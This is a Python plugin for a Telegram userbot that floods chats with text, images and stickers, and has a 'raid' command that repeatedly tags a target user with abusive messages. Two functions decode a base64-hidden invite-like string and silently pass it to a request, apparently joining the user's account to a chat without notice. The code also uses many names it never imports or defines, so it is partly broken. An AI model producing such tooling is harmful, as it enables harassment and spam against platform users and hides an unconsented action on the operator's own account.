import asyncio
import os

from telegraph import Telegraph, upload_file

from Lion.LionConfig import Config

from .. import CMD_HELP

#############-CONSTANTS-###############
LOGGER_GROUP = Var.PRIVATE_GROUP_ID
LOGGER = True
path = Config.TMP_DOWNLOAD_DIRECTORY
if not os.path.isdir(path):
    os.makedirs(path)
telegraph = Telegraph()
r = telegraph.create_account(short_name=Config.TELEGRAPH_SHORT_NAME)
auth_url = r["auth_url"]
#######################################

# ported by @its_xditya


@Lion.on(admin_cmd(pattern="tspam"))
@Lion.on(sudo_cmd(pattern="tspam", allow_sudo=True))
async def tmeme(e):
    tspam = str(e.text[7:])
    message = tspam.replace(" ", "")
    for letter in message:
        await e.respond(letter)
    await e.delete()


@Lion.on(admin_cmd(pattern="spam"))
@Lion.on(sudo_cmd(pattern="spam", allow_sudo=True))
async def spammer(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        counter = int(message[6:8])
        spam_message = str(e.text[8:])
        await asyncio.wait([e.respond(spam_message) for i in range(counter)])
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#SPAM \n\n" "Spam was executed successfully"
            )


@Lion.on(admin_cmd(pattern="bigspam"))
@Lion.on(sudo_cmd(pattern="bigspam", allow_sudo=True))
async def bigspam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        counter = int(message[9:13])
        spam_message = str(e.text[13:])
        for i in range(1, counter):
            await e.respond(spam_message)
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#BIGSPAM \n\n" "Bigspam was executed successfully"
            )


@Lion.on(admin_cmd(pattern="picspam"))
@Lion.on(sudo_cmd(pattern="picspam", allow_sudo=True))
async def tiny_pic_spam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        text = message.split()
        counter = int(text[1])
        r_message = await e.get_reply_message()
        downloaded_file_name = await borg.download_media(
            r_message, Config.TMP_DOWNLOAD_DIRECTORY
        )
        if downloaded_file_name.endswith((".webp")):
            resize_image(downloaded_file_name)
        try:
            x = upload_file(downloaded_file_name)
            url = f"https://telegra.ph/{x[0]}"
            os.remove(downloaded_file_name)
        except BaseException:
            return await e.edit("Error!")
        if url:
            for i in range(1, counter):
                await e.client.send_file(e.chat_id, url)
            await e.delete()
        else:
            await e.edit("Pic not supported :/")
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#PICSPAM \n\n" "PicSpam was executed successfully"
            )


@Lion.on(admin_cmd("delayspam (.*)"))
@Lion.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    async with event.client.action(event.chat_id, "typing"):
        await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            async with event.client.action(event.chat_id, "typing"):
                if event.reply_to_msg_id:
                    await sandy.reply(spam_message)
                else:
                    await event.client.send_message(event.chat_id, spam_message)
                await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            async with event.client.action(event.chat_id, "typing"):
                sandy = await event.client.send_file(
                    event.chat_id, sandy, caption=sandy.text
                )
                await _catutils.unsavegif(event, sandy)
                await asyncio.sleep(sleeptimem)

    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            async with event.client.action(event.chat_id, "typing"):
                await event.client.send_message(event.chat_id, spam_message)
                await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            async with event.client.action(event.chat_id, "typing"):
                await event.client(hmm)
        except BaseException:
            pass
        if LOGGER:
            if DelaySpam is not True:
                if event.is_private:
                    await event.client.send_message(
                        LOGGER_GROUP,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message",
                    )
                else:
                    await event.client.send_message(
                        LOGGER_GROUP,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message",
                    )
            else:
                if event.is_private:
                    await event.client.send_message(
                        LOGGER_GROUP,
                        "#DELAYSPAM\n"
                        + f"Delay spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message with delay {sleeptimet} seconds",
                    )
                else:
                    await event.client.send_message(
                        LOGGER_GROUP,
                        "#DELAYSPAM\n"
                        + f"Delay spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message with delay {sleeptimet} seconds",
                    )

            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await _catutils.unsavegif(event, sandy)
        return
    if LOGGER:
        if DelaySpam is not True:
            if event.is_private:
                await event.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
        else:
            if event.is_private:
                await event.client.send_message(
                    LOGGER_GROUP,
                    "#DELAYSPAM\n"
                    + f"Delay Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with delay {sleeptimet} seconds and with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    LOGGER_GROUP,
                    "#DELAYSPAM\n"
                    + f"Delay spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with delay {sleeptimet} seconds and with {counter} messages of \n"
                    + f"`{spam_message}`",
                )


@Lion.on(admin_cmd(pattern="spspam$"))
@Lion.on(sudo_cmd(pattern="spspam$", allow_sudo=True))
async def stickerpack_spam(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
        return await edit_delete(
            event, "`reply to any sticker to send all stickers in that pack`"
        )
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    try:
        stickerset_attr = reply.document.attributes[1]
        catevent = await edit_or_reply(
            event, "`Fetching details of the sticker pack, please wait..`"
        )
    except BaseException:
        await edit_delete(event, "`This is not a sticker. Reply to a sticker.`", 5)
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except Exception:
        return await edit_delete(
            catevent,
            "`I guess this sticker is not part of any pack so i cant kang this sticker pack try kang for this sticker`",
        )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    for m in reqd_sticker_set.documents:
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if LOGGER:
        if event.is_private:
            await event.client.send_message(
                LOGGER_GROUP,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with pack ",
            )
        else:
            await event.client.send_message(
                LOGGER_GROUP,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with pack",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@Lion.on(admin_cmd("cspam (.*)"))
@Lion.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
async def tmeme(event):
    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    for letter in message:
        await event.respond(letter)
    if LOGGER:
        if event.is_private:
            await event.client.send_message(
                LOGGER_GROUP,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                LOGGER_GROUP,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@Lion.on(admin_cmd("wspam (.*)"))
@Lion.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(event):
    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await event.delete()
    for word in message:
        await event.respond(word)
    if LOGGER:
        if event.is_private:
            await event.client.send_message(
                LOGGER_GROUP,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                LOGGER_GROUP,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@Lion.on(admin_cmd(pattern="raid (.*)"))
@Lion.on(sudo_cmd(pattern="raid (.*)", allow_sudo=True))
async def _(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id:
        a = await event.get_reply_message()
        b = await event.client.get_entity(a.sender_id)
        e = b.id
        c = b.first_name
        username = f"[{c}](tg://user?id={e})"

        input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
        sleeptimet = sleeptimem = float(input_str[0])
        cat = input_str[1:]
        counter = int(cat[0])
        async with event.client.action(event.chat_id, "typing"):
            for _ in range(counter):
                reply = random.choice(catmemes.RAIDHU)
                caption = f"{username} {reply} {username}"
                async with event.client.action(event.chat_id, "typing"):
                    await event.client.send_message(event.chat_id, caption)
                    await asyncio.sleep(sleeptimem)
    else:
        input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 3)
        sleeptimet = sleeptimem = float(input_str[0])
        cat = input_str[1:]
        user = input_str[2:]
        await event.delete()
        counter = int(cat[0])
        usern = random.choice(user)
        a = await event.client.get_entity(usern)
        e = a.id
        c = a.first_name
        username = f"[{c}](tg://user?id={e})"
        async with event.client.action(event.chat_id, "typing"):
            for _ in range(counter):
                reply = random.choice(catmemes.RAIDHU)
                caption = f"{username} {reply} {username}"
                async with event.client.action(event.chat_id, "typing"):
                    await event.client.send_message(event.chat_id, caption)
                    await asyncio.sleep(sleeptimem)


CMD_HELP.update(
    {
        "spam": "**Plugin : **`spam`\
        \n\n**  •  Syntax : **`.spam <count> <text>`\
        \n**  •  Function : **__ Floods text in the chat !!__\
        \n\n**  •  Syntax : **`.spam <count> reply to media`\
        \n**  •  Function : **__Sends the replied media <count> times !!__\
        \n\n**  •  Syntax : **`.spspam reply to sticker`\
        \n**  •  Function : **__spams the chat with all stickers in that pack__\
        \n\n**  •  Syntax : **`.cspam <text>`\
        \n**  •  Function : **__ Spam the text letter by letter.__\
        \n\n**  •  Syntax : **`.wspam <text>`\
        \n**  •  Function : **__ Spam the text word by word.__\
        \n\n**  •  Syntax : **`.delayspam <delay> <count> <text>`\
        \n**  •  Function : **__ .delayspam but with custom delay.__\
        \n\n**  •  Syntax : **`.raid <delay> <count> <username> or .raid <delay> <count> <reply to a user>`\
        \n**  •  Function : **__ Give abuses with tags.__\
        \n\n\n**Note : Spam at your own risk !!**"
    }
)
